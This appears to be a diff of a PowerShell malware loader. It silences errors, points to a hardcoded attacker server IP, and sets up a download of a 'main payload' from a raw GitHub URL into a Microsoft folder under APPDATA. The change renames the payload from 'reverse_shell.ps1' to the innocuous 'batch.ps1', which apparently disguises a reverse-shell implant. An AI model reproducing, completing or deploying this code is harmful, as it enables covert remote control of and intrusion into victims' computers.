@@ -3,8 +3,8 @@ $ErrorActionPreference = 'SilentlyContinue'
 
 # Configuration (UPDATE THIS WITH YOUR ARCH IP)
 $serverIP = "147.185.221.31"
-$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
-$payloadUrl = "https://raw.githubusercontent.com/JoshBeCute/letssee/main/reverse_shell.ps1"
+$localPayloadPath = "$env:APPDATA\Microsoft\Windows\batch.ps1"
+$payloadUrl = "https://raw.githubusercontent.com/JoshBeCute/letssee/main/batch.ps1"
 
 # 1. Download main payload if missing or forced update
 $isUpdate = $args -contains "-update"
